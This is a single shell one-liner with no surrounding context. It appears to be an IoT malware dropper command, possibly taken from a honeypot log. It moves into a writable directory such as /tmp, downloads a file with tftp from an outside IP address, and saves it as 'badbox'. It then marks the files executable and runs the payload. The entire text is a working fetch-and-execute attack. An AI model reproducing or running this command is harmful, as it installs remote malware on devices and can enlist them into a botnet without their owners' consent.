cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 198.12.97.74;cat tftp >badbox;chmod +x *;./badbox
